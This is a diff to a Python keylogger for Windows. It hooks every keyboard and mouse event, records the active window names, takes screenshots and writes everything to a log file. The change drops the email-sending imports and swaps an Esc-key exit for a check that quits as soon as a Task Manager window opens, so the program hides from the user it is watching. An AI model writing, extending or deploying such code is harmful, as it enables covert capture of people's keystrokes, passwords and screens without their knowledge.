@@ -3,7 +3,7 @@
 
 import sys
 import win32api, pythoncom
-import pyHook, os, time, random, smtplib, string, base64
+import pyHook, os, time, random, string
 import winreg
 import ctypes
 
@@ -55,8 +55,15 @@ def ScreenShot():
     pyautogui.screenshot().save(name + '.png')
 
 
-def is_ctrl_alt_delete_pressed():
-    return ctypes.windll.user32.GetAsyncKeyState(0x1B) != 0  # 0x1B is the virtual key code for Esc
+def is_task_manager_open():
+    # Check if Task Manager window is open
+    import win32gui
+
+    try:
+        hwnd = win32gui.FindWindow(None, "Task Manager")
+        return hwnd != 0
+    except:
+        return False
 
 
 def OnMouseEvent(event):
@@ -66,7 +73,7 @@ def OnMouseEvent(event):
     data += '\n\tButton:' + str(event.MessageName)
     data += '\n\tClicked in (Position):' + str(event.Position)
     data += '\n===================='
-    
+
     t = t + data
 
     if len(t) > 300:
@@ -92,7 +99,7 @@ def OnKeyboardEvent(event):
            + ' WindowName : ' + str(event.WindowName)
     data += '\n\tKeyboard key :' + str(event.Key)
     data += '\n===================='
-    
+
     t = t + data
 
     if len(t) > 500:
@@ -106,10 +113,10 @@ def OnKeyboardEvent(event):
         start_time = time.time()
         t = ''
 
-    if is_ctrl_alt_delete_pressed():
-        # Perform cleanup and exit the script
+    if is_task_manager_open():
+        # Perform cleanup and exit the script when Task Manager is open
         f = open('Logfile.txt', 'a')
-        f.write("\n[Script terminated by user]\n")
+        f.write("\n[Script terminated: Task Manager is open]\n")
         f.close()
         sys.exit()
 
